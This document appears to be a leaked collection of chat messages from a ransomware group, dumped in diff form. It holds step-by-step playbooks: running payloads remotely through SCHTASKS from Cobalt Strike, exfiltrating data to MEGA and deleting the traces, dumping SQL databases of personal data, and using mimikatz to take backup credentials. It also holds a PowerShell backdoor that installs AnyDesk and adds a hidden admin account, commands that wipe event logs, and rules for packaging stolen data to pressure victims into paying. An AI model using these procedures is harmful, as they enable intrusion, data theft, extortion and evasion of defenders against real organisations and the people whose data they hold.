@@ -1,0 +1,1409 @@
+Date: 2020-08-31T10:45:16.460Z
+From: alter
+Message: ```
+The structure is the following.
+The current composition is divided into groups, each group is assigned a team leader (one or two, depending on the size of the group).
+Ateam - team leader rozetka
+Bteam - team leaders red and ali
+Cteam - team leader steven
+
+Team leaders are responsible for:
+1. Issue cases for work
+2. Teach, advise, instruct
+3. Connect in the process of solving atypical or previously not completed tasks
+4. Help with load builds, networking and other technical issues related to software
+5. Provide the necessary guides and manuals
+
+The working group is required to:
+1. Listen
+2. Watch
+3. Do
+4. Learn
+5. Ask questions
+6. Follow the guides and instructions, complete the assigned tasks
+
+An example regulation is as follows.
+- Got a session
+- Removed primary information
+- We created a channel in the rocket (everyone has this function), we call the channel the full main domain of the case (for example, google.com microsoft.com), add me + your group's team leaders there
+- Uploaded primary information to the channel according to a given template (composition of adfind output domain, list of domain admins, enterprise admins, local admins, kerberos hashes, seatbelt output, sharefinder output, etc.)
+
+We work from 15 to 01
+from 19 to 20 we conduct a public analysis of problems in the discussion channel. Any technical questions are also there. For organizational questions - write in a personal.
+
+================================
+
+Date: 2020-09-11T15:18:09.639Z
+From: cybercat
+Message: and this is an archive with a bunch of dlls, then we fill it with an extract in the mg folder, it doesn’t load here, so download it from the link:
+https://mega.nz/file/G4wzjYxI#oVtJtRACPNiQEMLYaqa88Fx7UzqSbEAlv0dULAYo6gg
+
+Date: 2020-09-11T13:28:14.465Z
+From: cybercat
+Message: --- If you need to download a lot of heavy files from the ball, then it will take a very long time to pull through the koba, you can pull everything at once to the mega via megacmd, having previously archived ---
+First archive the files in zip
+```
+MegaNZ usage
+1) Create folder for files
+2) Uploads exe and dll files to created folder
+3) Start background MEGAcmdServer.exe
+4) Use the commands:
+> MEGAclient.exe update --auto=off # disable autoupdate for megacmd
+> MEGAclient.exe login login password # init session by creds
+> MEGAclient.exe whoami # check connection
+> MEGAclient.exe put -q --ignore-quota-warn test.txt # upload file to acc storage [-q background process]
+> MEGAclient.exe ls # check remote directory
+> MEGAclient.exe logout # end session
+> MEGAclient.exe quit # kill MEGAcmdServer.exe
+5) Remove special folder for MEGAcmd
+6) Remove update task from schtasks:
+> schtasks /query /FO list | findstr /i "mega"
+> SCHTASKS /TN "\mega\ FULL NAME HERE" /DELETE /F
+
+
+example:
+
+> MEGAclient.exe update --auto=off
+	Automatic updates disabled
+
+> MEGAclient.exe login supertest@mail.test P@$$w0rd
+	log in
+
+> MEGAclient.exe whoami
+	Account e-mail: supertest@mail.test, check our account
+
+> MEGAclient.exe put -q --ignore-quota-warn C:\temp\test.txt
+	upload test.txt
+
+> MEGAclient.exe ls
+	test.txt, check what files already uploaded
+
+> MEGAclient.exe logout
+	Logging out...
+
+> MEGAclient.exe quit
+	close megaclient
+
+> schtasks /query /FO list | findstr /i "mega"
+Folder: \MEGA
+TaskName: \MEGA\MEGAcmd Update Task S-1-5-10-1145623454-6237456245-1243533621-3000
+> SCHTASKS /TN "\MEGA\MEGAcmd Update Task S-1-5-10-1145623454-6237456245-1243533621-3000" /DELETE /F
+
+then you can still check through the tasklist, and use taskkil to kill the mega process
+
+================================
+
+Date: 2020-10-09T19:41:37.815Z
+From: rosette
+Message: ```Starting a binary on a remote machine via SCHTASKS from Cobalt Strike
+
+We put it on
+
+\\remote-hostname123\c$\Programdata\srvvhost.exe
+
+1. Create a task using SCHTASKS :: OUTPUT SYSTEM CONTEXT
+
+shell SCHTASKS /s remote-hostname123 /RU "SYSTEM" /create /tn "WindowsSensor15" /tr "cmd.exe /c C:\ProgramData\srvvhost.exe" /sc ONCE /sd 01/01/2021 /st 00: 00
+
+1.1 If everything is fine, we see in response
+
+[+] received output:
+SUCCESS: The scheduled task "WindowsSensor15" has successfully been created.
+
+2. Start the task
+
+
+shell SCHTASKS /s remote-hostname123 /run /TN "WindowsSensor15"
+
+2.1 In response, we see:
+
+
+SUCCESS: Attempted to run the scheduled task "WindowsSensor15".
+
+---
+
+At this point, the session should arrive. If it doesn't come, there are several options:
+
+no internet, binary burned, firewall
+
+3. Delete the task
+
+shell schtasks /S remote-hostname123 /TN "WindowsSensor15" /DELETE /F
+
+SUCCESS: The scheduled task "WindowsSensor15" was successfully deleted.
+
+Also available with user context. Works with domain\login + password
+
+Everything is the same
+     
+shell SCHTASKS /s 192.168.97.23 /U "domainad.com\ralexand" /P "Password123" /RU "domainad.com\ralexand" /create /tn "WindowsSensor1" /tr "cmd.exe /c C:\ProgramData\ x64.exe" /sc ONCE /sd 01/01/2020 /st 00:00
+
+shell SCHTASKS /s 192.168.97.23 /run /TN "WindowsSensor1"
+
+shell schtasks /S 192.168.97.23 /TN "WindowsSensor1" /DELETE /F
+
+!!!Do not forget to do after you have received a spawn or inject session into the process, cutting down your process and deleting the binary you entered. So the payload will live much longer
+
+================================
+
+Date: 2021-01-23T00:11:34.197Z
+From: tl1
+Message: ```
+1. Collection of primary information about the domain and the environment
+- Full domain name
+-DCs list
+- LA\DA\EA
+- Password policy
+-PS
+-EDR
+- Systeminfo
+based on the information received, we look at what kind of network is in front of us: workgroup with vpn, av lab, work network. If it is impossible to draw a conclusion based on the data from step 1, go to step 2
+2. Collection of information about blood pressure
+-ADFind
+- ADFind trust
+if the total size of the files is more than 40mb, then you need to put them in the archive. After analyzing blood pressure, we draw a conclusion about the type of network. If the workgroup is without domain visibility, skip and take the trail. network to work. If a full-fledged network, go ahead
+3. Collecting additional information about the domain and the environment
+- Dump browsers
+- Seatbelt
+- kerberoast, asreproast
+- DuzzleUP
+- WinPEAS
+- Watson
+- GPP
+- ShareFinder
+- Check Zero Logon
+all the files in the process and the logs into a folder with the name of the external network domain, under the names corresponding to the utilities that you ran. Hashes for brute you pass to team lead 2
+4. Add. actions. During the execution of ShareFinder, we run a persistence on the entry point (ONLY IF IT HAS BEEN TOLD IN ADVANCE)
+- we generate a NEW build for EVERY launch
+- hide dll in user folders (preferably appdata and as far as possible)
+- run, check if the dll has been deleted + if the shell has appeared, write to me: host name, launch rights
+all files are duplicated in the conf, and are also added to a separate folder locally. You put information about DC, LA, DA, EA, and all passwords found in the process into a separate file creds.txt
+5. If during or after the completion of ShareFinder, as well as a quick hash brute, you get the opportunity to get out of the entry point, then we use this inapplicably. Such a network gets a priority and is not interrupted in operation.
+
+================================
+
+Date: 2021-03-05T00:42:03.640Z
+From: alter
+Message: ```
+Regulations for submitting a case and working with data:
+
+1. Upon completion of the lock, we issue information in the corresponding configuration in the following form
+
+	https://domain.com
+	100 Servers 1000 Workstations
+
+	Mega:
+	guerillamailaccount@sharklasers.com
+	ComPl3xAndh3@vyP@s))91
+
+	200 GB (here we indicate the amount of data in unzipped form, if this type is not clear, we mark COMPRESSED)
+
+	COMPANY NAME creates elite transgender sex dolls for the US presidential administration.
+
+2. After that, in the near future we set the data to merge from the mega and prepare the Data-pack in parallel
+
+3. Data-pack is delivered as follows
+
+	full-listing.txt - full listing of all files downloaded from mega
+	30percentlisting.txt - 30% off full listing with focus on HR/Finance folders/database tables with private information
+	datapack-example.zip - a small archive containing files from 30percentlisting.txt with priority on files containing confidential information, document scans, HR documents, closed company projects (the archive is small, weighing 10-30 megabytes)
+
+4. Insurance. In the process of data retrieval and in the process of parsing, we are looking for files containing cyber insurance conditions, standard search tags
+
+	Cyber
+	policy
+	insurance
+	endorsement
+	supplementary
+	underwriting
+	terms
+	
+	If such files with the content of insurance conditions are found, we MUST upload them separately to the channel upon completion of the case, they are an IMPORTANT subject of bargaining.
+
+The presence of files on the network indicating the GDPR significantly increases the success of the payment, this is the standard that is adhered to in storing user data, the company will face significant fines for their leakage.
+Please pay attention to this abbreviation in the process of work and in the process of uploading the listing of files and indicate this in the submission of the report.
+	
+5. What data should you pay special attention to?
+	
+	Databases containing information such as: email addresses / names / surnames / addresses / payment cards / DOB / SSN / Drivers License (all such DBMS must be exported and sample records from these DBMS are contained in the Data-pack).
+	Files and databases relating to company employees (they almost always contain private information similar to the one described above)
+	Content of mail servers (correspondence is a very strong pressure factor, uploading the contents of mailboxes of the control link is IMPORTANT if this is uploaded - it is worth mentioning separately with a listing of employees and their positions whose mail archives are uploaded)
+	Contents of Accounting/Finance/HR/Projects/Confidential folders
+	Sources of software, if it is developed in the company
+	
+6. 	Data from the mega must be downloaded entirely to a dedicated server
+
+================================
+
+Date: 2021-02-06T15:44:37.064Z
+From: white
+Message: gentlemen, who will tell you how to set up socks correctly on the server with MSF?
+1) There is a meterpreter session on the server in the kobu, it does not spawn
+2) I want to run Sox on the server so that I can look at the network from the local host
+what's done is done: route prescribed
+```
+IPv4 Active Routing Table
+------ ------- -------
+172.0.0.0 255.0.0.0 Session 4
+
+```
+2) Soks launched: the port on the server opened and listens
+```
+msf6 auxiliary(server/socks4a) > set srv
+set srvhost set srvport
+msf6 auxiliary(server/socks4a) > set srvhost 185.212.129.112
+srvhost => 185.212.129.112
+msf6 auxiliary(server/socks4a) > set srvport 1000
+srvport => 1000
+msf6 auxiliary(server/socks4a) > run
+[*] Auxiliary module running as background job 0.
+[*] Starting the socks4a proxy server
+msf6 auxiliary(server/socks4a) > netstat -antp | grep1000
+[*] exec: netstat -antp | grep1000
+tcp 0 0 185.212.129.112:1000 0.0.0.0:* LISTEN 30554/ruby
+msf6 auxiliary(server/socks4a) > netstat -npl
+[*] exec: netstat -npl
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name
+tcp 0 0 185.212.129.112:300 0.0.0.0:* LISTEN 555/ruby
+tcp 0 0 185.212.129.112:305 0.0.0.0:* LISTEN 30554/ruby
+tcp 0 0 185.212.129.112:1000 0.0.0.0:* LISTEN 30554/ruby
+```
+UVW disable
+
+I prescribe the port in the proxychain ip of the server, I try to ping the hosts from the network do not respond.
+
+================================
+
+Date: 2021-03-01T16:48:28.102Z
+From: cybercat
+Message: Accessing a server with Shadow Protect SPX backups (StorageCraft)
+```
+==
+1. We go via RDP to one of the servers, in my case it is a SQL server.
+2. on the desktop we see the icon of the ShadowProtect SPX software
+	-> click on it
+3. gui opens (if it asks for credits, enter those under which you entered via RDP, or any other YES)
+4. On the left in the "Job Summary" block, we see a detailed description of the backup scheme
+	in the "Name" field - the name of the backup of our server
+	in the "Destination" field - the place WHERE our spx stores the backups, in the form of SERVA_BA_NAME (SHARE WITH BACKUP ON THIS SERVER)
+		From our example, we can conclude that all backups are stored in a ball called StorageCraft, and folders with server backups are named after the name of the server itself.
+5. Knowing the name of the backup server, we want to get a better idea of its structure, first of all we get the balls with the command "cmd.exe> net view \\COH-DSS3 /ALL", in response we get "Error 5: Access Denied"
+6. There is no access, we try to knock with other accounts YES - the answer is the same - error n 5, it would be logical to assume that in order to access the server we need either local admin credits on this very server, or a special user account with dedicated rights
+7. Suppose that if this is a dedicated user, then it has a name similar to the software\function:
+	iterate over logins with the occurrence of substrings (here we need to turn on fantasy):
+		Storage
+		Shadow
+		Protect
+		Craft
+		SP
+		SPX
+		Backup
+		BUUser
+		ETC.
+	then we do a search on ntds.dit (hashes.txt.ntds) to find the hash, in my case the search was successful and I found the user Humanity.local\SPAdmin (I think it’s clear that this is Shadow Protect Admin) and its hash ce31b806821bec116ba03132ab5b3138, BUT unfortunately the search on cmd5.org did not give any result, and I desperately need a clearpass. (If you have enough hash, then congratulations - you have reached the result)
+8. But if you still need a clearpass or you could not find a suitable user, we will understand that if the software somehow knocks on the server, then the credits are known to it, which means they could remain on the server.
+	Trying to dump hashes
+	I won’t describe in detail here how to do it, but you should try hashdump (and its legitimate analogues) and logonpasswords (and analogues)
+	In my case, I used a mimic and dumped lsass, in which I found a clearpass from my SPAdmin account - kerberos:
+* Username : SPAdmin
+* Domain : COHBackup
+* Password : Backup!User
+(in my case, for some reason, the domain was not Humanity.local but COHBackup, although you can also knock on Humanity.local (replace with your own value))
+9. We go to the explorer, and open the necessary share "\\COH-DSS3\StorageCraft" through it, it asks me for credits, I enter COHBackup\SPAdmin and Backup!User and successfully get access
+10. Also in some grids there may be several backup servers, as an option to check this, this is to click on the Backup button in the upper left corner of the gui (immediately after File) then - Destinations -> and we will see what are the ways to save backups
+===
+I'm not sure if this method will work for everyone, but in my case it worked, good luck!
+
+================================
+
+Date: 2021-03-01T13:48:18.300Z
+From: cybercat
+Message: if suddenly someone has no cheekbone
+```
+1. Output in cmd all databases on the server
+sqlcmd -S localhost -E -Q "SELECT name FROM master.dbo.sysdatabases;"
+	you can also add a port
+
+1.2. to view a non-standard port from the schoolserver, you need to enter | shell netstat -abno | = scanning ports and services on them through cobald
+	there we find on which port it is spinning | sqlserver.exe | and specify it after localhost in this way - | localhost,12345 |
+
+	1.2.2. Output to cmd all databases on the server with size in megabytes
+sqlcmd -S localhost -E -Q "SELECT d.name, ROUND(SUM(mf.size) * 8 / 1024, 0) FROM sys.master_files mf INNER JOIN sys.databases d ON d.database_id = mf.database_id WHERE d .database_id > 4 GROUP BY d.name ORDER BY d.name;"
+
+
+2. Unloading the 100 most saturated in terms of the number of rows of tables in the database, the number of rows and the size of the tables on the hard drive
+sqlcmd -S localhost -E -Q "USE %databasename% SELECT TOP 100 s.Name AS SchemaName, t.Name AS TableName, p.rows AS RowCounts, CAST(ROUND((SUM(a.total_pages) / 128.00), 2 ) AS NUMERIC(36, 2)) AS Total_MB FROM sys.tables t INNER JOIN sys.indexes i ON t.OBJECT_ID = i.object_id INNER JOIN sys.partitions p ON i.object_id = p.OBJECT_ID AND i.index_id = p .index_id INNER JOIN sys.allocation_units a ON p.partition_id = a.container_id INNER JOIN sys.schemas s ON t.schema_id = s.schema_id GROUP BY t.Name, s.Name, p.Rows ORDER BY RowCounts desc, Total_MB desc ;"
+
+3. Counting rows in a specific table of a specific database
+sqlcmd -S localhost -E -Q "select count(*) from %databasename%.dbo.%tablename%;"
+
+4. Unloading the first 10 records in a specific table of a specific database
+sqlcmd -S localhost -E -Q "select top 10 * from %databasename%.dbo.%tablename%;"
+sqlcmd -S localhost -E -Q "use %databasename%; select top 10 * from %tablename%" -W
+
+5. Search by column names in a specific database using the example of %pass%
+sqlcmd -S localhost -E -Q "select COLUMN_NAME as 'ColumnName', TABLE_NAME as 'TableName' from %databasename%.INFORMATION_SCHEMA.COLUMNS where COLUMN_NAME like '%pass%';"
+
+6. Uploading the data of the contents of specific columns from a specific table to a txt file in a folder (in this example, by the numerical value of the table> date
+sqlcmd.exe -S localhost -E -Q "select UserKey, EmailAddress, RealName, Phone, FirstName, LastName, CountryName, CreatedDate from %databasename%.dbo.%tablename% where CreatedDate > '2017-11-30';" -W -s"|" -o "C:\temp\123.txt"
+
+7. Displaying all tables of a specific database
+sqlcmd -S localhost -E -Q "use %databasename%; exec sp_tables" -W
+
+8. Backup database
+sqlcmd -S localhost -E -Q "BACKUP DATABASE name TO DISK='C:\PerfLogs\name.bak'"
+
+
+for a remote/another local server, change localhost to ip,port
+as an option - localhost,%port% (see netstat)
++
+9. to select a non-standard port for mssl, write the address, port = localhost, 52541 example
++
+
+================================
+
+Date: 2021-03-05T05:22:14.070Z
+From: alter
+Message: ```
+pressing spread opens a window with 5 fields
+1 In the first field, you must select the path to the artifact file for creating sessions or the exe/bat/dll file for the payload
+2 The wmi/plsexec method is selected in the combobox
+3 In the third field, the file download path is written by default, it is "C:\ProgramData"
+4 In the fourth field, select the path to the ip/host list
+5 Arguments are entered in the start line, if there are no arguments, you just need to click Run Spread
+6 By pressing the Run Spread button, a request is made to the domain controller ip / host from the list; in response, addresses to target hosts are received
+7 Generates a UNC path to the given directory
+8 The paths are sent to the download function and it loops to download the selected file.
+9 After a pause of 10 seconds (it can be adjusted), in order to be sure that the file is in the selected directory, the launch command is sent with arguments (if they were specified)
+```
+================================
+
+Date: 2021-06-07T19:47:22.114Z
+From: graph
+Message: ```Armitage installation
+1. Install the metasploit
+	curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
+		
+		; ./msfconsole run metasploit
+
+2. Install PostgreSQL
+	
+	apt-get -y install postgresql
+	
+3. Install Armitage
+
+	wget http://fastandeasyhacking.com/download/armitage150813.tgz
+	tar zxvf armitage150813.tgz
+
+4. Initialize the base metasploit
+
+	msfdb init
+
+		; msfdb reinit - Deletes and reinitializes the database.
+		; msfdb delete - Deletes the database.
+		; msfdb start - Starts the database.
+		; msfdb stop - Stops the database.
+		; msfdb status - Shows the database status.
+
+	export MSF_DATABASE_CONFIG=/home/%username%/.msf4/database.yml
+
+5. Launch Armitage Teamserver
+
+	cd /path/to/armitage
+	./teamserver [external IP address] [password]
+	
+
+useful links
+
+	Install Metasploit Framework -
+		https://docs.rapid7.com/metasploit/installing-the-metasploit-framework/
+	Installation Armitage -
+		http://www.fastandeasyhacking.com/manual
+
+Required packages
+```
+================================
+
+Date: 2021-06-07T19:47:07.513Z
+From: red
+Message: ```
+1. Take debian or ubuntu dedic (ssh username@hostname)
+
+Check for postgresql
+
+sudo apt install postgresql
+
+sudo apt-get -y install postgresql
+
+================================================= ================================================= =========================
+2. Download and install the metasploit
+     
+x64
+wget http://downloads.metasploit.com/data/releases/archive/metasploit-4.16.2-2020011301-linux-x64-installer.run
+      
+Next suitcase (allow scripts to run)
+
+chmod +x metasploit-4.16.2-2020011301-linux-x64-installer.run
+
+chmod +x metasploit-4.13.0-2017022101-linux-x64-installer.run
+
+Next install ./metasploit-4.16.2-2020011301-linux-x64-installer.run
+
+
+https://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.run
+
+================================================= ================================================= =========================
+3. We leave all the default ports and prescribe a random local domain
+
+addada.com domain
+
+================================================= ================================================= =========================
+4. After installing the MSF
+
+Installing the editor
+
+sudo apt install nano
+
+Editing scripts 1
+
+nano /etc/init.d/metasploit
+
+#exec /opt/metasploit/ctlscript.sh "$@"
+exec /opt/metasploit/postgresql/scripts/ctl.sh "$@"
+
+Editing scripts 2
+
+nano /etc/rc.local add these lines before exit 0
+
+ln -sf /dev/null /var/log/wtmp
+ln -sf /dev/null /var/run/utmp
+ln -sf /dev/null /var/log/lastlog
+ln -sf /dev/null /var/log/auth.log
+ln -sf /dev/null /var/log/btmp
+ln -sf /dev/null /var/log/dmesg
+ln -sf /dev/null /var/log/faillog
+ln -sf /dev/null /var/log/kern.log
+ln -sf /dev/null /var/log/syslog
+ln -sf /dev/null /var/log/user.log
+ln -sf /dev/null /var/log/secure
+ln -sf /dev/null /root/.bash_history
+
+iptables -A INPUT -i eth0 -p tcp -m tcp --dport 3790 -j DROP
+================================================= ================================================= =========================
+5. We put the reality so that the armitage works
+
+apt-get update && apt-get upgrade
+
+apt-get install default-jdk
+================================================= ================================================= =========================
+6. Download and unpack armitage (teamserver) from this url (tgz archive is up-to-date)
+wget http://fastandeasyhacking.com/download/armitage150813.tgz
+tar zxvf armitage150813.tgz
+================================================= ================================================= =========================
+7. Change the port in the armitage (before launch) in the teamserver script towards the end of the file
+
+nano armitage/teamserver
+================================================= ================================================= =========================
+8. Open screen (so that you can run armitage in the background and exit the server), and execute
+
+apt-get install screen
+
+run screen
+
+cd /root/armitage && ./teamserver IP PASS
+================================================= ================================================= =========================
+9. We wait until everything starts up and a message appears with credits for armitage, and exit the screen using the Ctrl + a combination and then separately d
+================================================= ================================================= =========================
+10. Change SSH password (passwd root ...)
+================================================= ================================================= =========================
+11. (change ssh port / do authorization by key on a server)
+
+nano /etc/ssh/sshd_config
+================================================= ================================================= =========================
+```
+================================
+
+Date: 2021-06-07T19:46:52.768Z
+From: atom
+Message: mkdir /opt/
+cd /opt/
+wget https://github.com/rapid7/metasploit-framework/archive/4.16.37.zip
+unzip 4.16.37.zip
+mv metasploit-framework-4.16.37 metasploit-framework
+sudo chown -R `whoami` /opt/metasploit-framework
+cd /opt/metasploit-framework
+gem install bundler
+bundle install
+cd /opt/metasploit-framework
+sudo bash -c 'for MSF in $(ls msf*); do ln -s /opt/metasploit-framework/$MSF /usr/local/bin/$MSF;done'
+
+================================
+
+Date: 2021-07-16T02:55:36.846Z
+From: atom
+Message: ```
+Cleaning out the dens
+
+1 Start a PowerShell console as an administrator and use the following command to list all classic event logs on your system, with their maximum sizes and the number of events in them.
+
+Get-EventLog –LogName*
+
+2 To clear all event logs, you would need to redirect the log names to the pipeline, however, unfortunately this is not allowed. Therefore, we will have to use the ForEach loop:
+
+Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
+
+3 For working with events in Windows, a powerful command-line utility WevtUtil.exe has been available for quite some time.
+
+To display a list of event logs registered in the system, run the command:
+
+WevtUtil enum-logs
+
+Clearing events in a specific log is done like this:
+
+WevtUtil cl Setup
+
+Before cleaning, you can back up the events in the log by saving them to a file:
+
+WevtUtil cl Setup /bu:SetupLog_Bak.evtx
+
+To clear all logs at once, you can use the Powershell Get-WinEvent cmdlet to get all log objects and Wevtutil.exe to clear them:
+
+Get-WinEvent -ListLog * -Force | % { Wevtutil.exe cl $_.LogName }
+
+or so
+
+Wevtutil el | ForEach { wevtutil cl "$_"}
+
+
+4 Clearing logs can also be done from the classic command line:
+
+for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"
+
+Batch file for cleaning logs
+
+PHP:
+ 
+break>"%CD%\server_log.txt"
+
+break>"%CD%\logs\errors.log"
+break>"%CD%\logs\log-core.log"
+break>"%CD%\logs\warnings.log"
+break>"%CD%\logs\plugins\mysql.log"
+
+
+Clear all Windows Event Viewer logs
+1.CMD
+for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"
+
+2. PowerShell
+Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
+
+================================
+
+Date: 2021-08-12T12:13:02.479Z
+From: cybercat
+Message: guys, a very useful thing, in fact you have 2 axes on 1 dedik, it’s convenient for working from under a vpn
+linux terminal in windows, need 2019 server
+```
+===
+we need windows server 2019+
+1. run poower shell as administrator and type:
+	> Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux
+
+2. Download linux subsystem distro from: https://docs.microsoft.com/en-us/windows/wsl/install-manual
+like:
+	kali: https://aka.ms/wsl-kali-linux-new
+	ubuntu18.04: https://aka.ms/wsl-ubuntu-1804
+	ubuntu20.04: https://aka.ms/wslubuntu2004
+	debian: https://aka.ms/wsl-debian-gnulinux
+
+3. Open poowershell and extract files from appx like:(Ubuntu -> changed_name)
+copy .appx downloaded file to C:\Users\Administrator and go to the this folder in pwsh
+
+	> Rename-Item .\Ubuntu.appx .\Ubuntu.zip
+> Expand-Archive .\Ubuntu.zip .\Ubuntu
+> cd kali
+
+4. Run Ubuntu.exe
+
+5. Add your distro path to the Windows environment PATH (C:\Users\Administrator\Ubuntu in this example), using PowerShell:
+
+$userenv = [System.Environment]::GetEnvironmentVariable("Path", "User")
+[System.Environment]::SetEnvironmentVariable("PATH", $userenv + ";C:\Users\Administrator\Ubuntu", "User")
+
+!1/ if you dont have exe in your folder, check this steps with another distro
+!2/ Installation failed with error 0x8007007e: If you receive this error, then your system doesn't support WSL. Ensure that you're running Windows build 16215 or later. Check your build. Also check to confirm that WSL is enabled and your computer was restarted after the feature was enabled.
+```
+================================
+
+Date: 2021-05-10T20:37:35.710Z
+From: twin
+Message: This is how we ping hosts
+
+Date: 2021-05-10T20:36:42.557Z
+From: twin
+Message: ```1. CREATE ON THE DESKTOP TXT FILE WITH THE NAME domains.txt
+2. DO YOU HAVE SORTED OR SIMPLY LOCAL NAMES OF COMPUTERS PUT THEM INTO THIS FILE
+3. UPLOAD THE MACHINE (C:\ProgramData\) FROM WHICH WILL GO PING FILE domains.txt and p.bat
+4. RUN p.bat USING THE shell COMMAND
+5. AFTER PING DOWNLOAD THE FILE res.txt
+
+================================
+
+Date: 2021-05-10T20:34:16.056Z
+From: twin
+Message: ```I'll tell you one more thing about ad_users , there is a lot of information about employees, you can find techies, engineers, etc. there. We usually need ad_users when we want to find the admin's wheelbarrow, because on the admin's wheelbarrows we can find passwords from the antivirus console, from cloud backups, and so on. Now I'll throw off the manual on the USERHUNTER, with the help of it, we find these cars. We also need ad_users to get the SID from there for the golden ticket, but more on that later
+1. make a list of targets
+1.1 We open ad_users, we are looking for someone who is potentially interesting to us: admin / engineer / inform technologists / IT
+we take account logins from sAMAccountName
+1.2 We take a list of domain admins
+1.3 put the first and second in the list.txt file
+
+2. Appload power view.
+2.1 powershell-import _/home/user/soft/powerview/view.ps1_
+2.1 --comment: import power view from /home/user/soft/powerview/view.ps1
+
+2.3 Turn on hunting
+2.3.1
+psinject 1884 x64 Invoke-UserHunter -Threads 20 -UserFile C:\ProgramData\list.txt >> C:\ProgramData\out.txt
+
+instead of 1884 - the PID of the process where we have enough rights to inject.
+x64 - or x86 bit depth of the process. see tasklist
+In c\programdata\list.txt there should be a list that we did in point No. 1.
+after 5-10-20 minutes, watch the result in out.txt. As soon as he finishes, he replenishes it at once. that is, if the file is 0 bytes, it means it works or AB burned (if you burned av, you will see in the box)
+
+================================
+
+Date: 2021-05-10T20:31:56.740Z
+From: twin
+Message: This is how we spin SKOLLE
+
+Date: 2021-05-10T20:31:34.023Z
+From: twin
+Message: ```0. see who is working with the database (hosts and users from where they connected to it)
+shell sqlcmd -S localhost -Q "select loginame, hostname from sys.sysprocesses"
+
+1. Output in cmd all databases on the server
+shell sqlcmd.exe -S localhost -E -Q "SELECT name FROM master.dbo.sysdatabases;"
+
+with size in megabytes
+shell sqlcmd -S localhost -E -Q "SELECT d.name, ROUND(SUM(mf.size) * 8 / 1024, 0) FROM sys.master_files mf INNER JOIN sys.databases d ON d.database_id = mf.database_id WHERE d.database_id > 4 GROUP BY d.name ORDER BY d.name;"
+
+2. Unloading the 100 most saturated in terms of the number of rows of tables in the database, the number of rows and the size of the tables on the hard drive
+sqlcmd -S localhost -E -Q "USE %databasename% SELECT TOP 100 s.Name AS SchemaName, t.Name AS TableName, p.rows AS RowCounts, CAST(ROUND((SUM(a.total_pages) / 128.00), 2 ) AS NUMERIC(36, 2)) AS Total_MB FROM sys.tables t INNER JOIN sys.indexes i ON t.OBJECT_ID = i.object_id INNER JOIN sys.partitions p ON i.object_id = p.OBJECT_ID AND i.index_id = p .index_id INNER JOIN sys.allocation_units a ON p.partition_id = a.container_id INNER JOIN sys.schemas s ON t.schema_id = s.schema_id GRchfOUP BY t.Name, s.Name, p.Rows ORDER BY RowCounts desc, Total_MB desc ;"
+2.1.
+sqlcmd -S localhost -E -Q "USE %databasename% SELECT TOP 100 s.Name AS SchemaName, t.Name AS TableName, p.rows AS RowCounts, CAST(ROUND((SUM(a.total_pages) / 128.00), 2 ) AS NUMERIC(36, 2)) AS Total_MB FROM sys.tables t INNER JOIN sys.indexes i ON t.OBJECT_ID = i.object_id INNER JOIN sys.partitions p ON i.object_id = p.OBJECT_ID AND i.index_id = p .index_id INNER JOIN sys.allocation_units a ON p.partition_id = a.container_id INNER JOIN sys.schemas s ON t.schema_id = s.schema_id GROUP BY t.Name, s.Name, p.Rows ORDER BY RowCounts desc, Total_MB desc ;"
+
+3. Counting rows in a specific table of a specific database
+sqlcmd -S localhost -E -Q "select count(*) from %databasename%.dbo.%tablename%;"
+
+4. Unloading the first 10 records in a specific table of a specific database
+sqlcmd -S localhost -E -Q "select top 10 * from %databasename%.dbo.%tablename%;"
+sqlcmd -S localhost -E -Q "use %databasename%; select top 10 * from %tablename%" -W
+
+5. Search by column names in a specific database using the example of %pass%
+sqlcmd -S localhost -E -Q "select COLUMN_NAME as 'ColumnName', TABLE_NAME as 'TableName' from %databasename%.INFORMATION_SCHEMA.COLUMNS where COLUMN_NAME like '%pass%';"
+
+6. Uploading the data of the contents of specific columns from a specific table to a txt file in a folder (in this example, by the numerical value of the table> date
+sqlcmd.exe -S localhost -E -Q "select UserKey, EmailAddress, RealName, Phone, FirstName, LastName, CountryName, CreatedDate from %databasename%.dbo.%tablename% where CreatedDate > '2017-11-30';" -W -s"|" -o "C:\temp\123.txt"
+FULL >
+sqlcmd.exe -S localhost -E -Q "select * from %databasename%.dbo.%tablename%" -W -s"|" -o "C:\Windows\Temp\1.txt"
+
+7. Displaying all tables of a specific database
+shell sqlcmd -S localhost -E -Q "use %databasename%; exec sp_tables" -W
+
+for a remote/another local server, change localhost to ip,port
+as an option - localhost,%port% (see netstat)
+
+If the table or database is called from 2-3-4 words, then it is escaped like this [%databasename/tablename%]
+
+sqlcmd -E -S localhost -Q "BACKUP DATABASE databasename TO DISK='d:\adw.bak'"
+
+================================
+
+Date: 2021-05-10T20:29:36.043Z
+From: twin
+Message: ``` Pin AnyDesk - see all
+Function AnyDesk {
+
+mkdir "C:\ProgramData\AnyDesk"
+# Download AnyDesk
+$clnt = new-object System.Net.WebClient
+$url = "http://download.anydesk.com/AnyDesk.exe"
+$file = "C:\ProgramData\AnyDesk.exe"
+$clnt.DownloadFile($url,$file)
+
+cmd.exe /c C:\ProgramData\AnyDesk.exe --install C:\ProgramData\AnyDesk --start-with-win --silent
+
+cmd.exe /c echo J9kzQ2Y0qO | C:\ProgramData\anydesk.exe --set-password
+
+net user oldadministrator "qc69t4B#Z0kE3" /add
+net localgroup Administrators oldadministrator /ADD
+reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v oldadministrator /t REG_DWORD /d 0 /f
+
+cmd.exe /c C:\ProgramData\AnyDesk.exe --get-id
+
+}
+
+AnyDesk
+
+
+Run code in Powershell ISE Run As Admin
+At the output we get an ID
+We keep it to ourselves
+On a separate dedicated disk \ vps \ virtual machine, download Anydesk, specify the ID
+Click Console Account
+Enter password
+Quote
+
+J9kzQ2Y0qO
+
+And then we log in with a local admin or a domain account and use the charms of Anydesk
+You can also download / upload to / from the victim's machine, which can be convenient in inspecting and searching for documentation point by point.
